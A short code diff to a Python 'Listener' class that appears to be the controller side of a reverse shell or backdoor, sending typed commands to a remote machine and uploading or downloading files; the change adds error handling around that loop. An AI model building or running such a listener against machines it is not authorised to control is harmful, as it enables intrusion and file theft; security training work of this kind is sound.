@@ -52,14 +52,18 @@ class Listener:
         while True:
             command = input('>> ')
             command = command.split(" ")
-            if command[0] == 'upload':
-                # Appending contetn of file to upload
-                command.append(self.read_file(command[1]))
 
-            result = self.execute_remotely(command)
+            try:
+                if command[0] == 'upload':
+                    # Appending contetn of file to upload
+                    command.append(self.read_file(command[1]))
 
-            if command[0] == 'download':
-                result = self.write_file(command[1], result.encode())
+                result = self.execute_remotely(command)
+
+                if command[0] == 'download' and '[-] Error ' not in result:
+                    result = self.write_file(command[1], result.encode())
+            except Exception:
+                result = '[-] Error occuered during executing command.'
             print(result)
 
 # Example
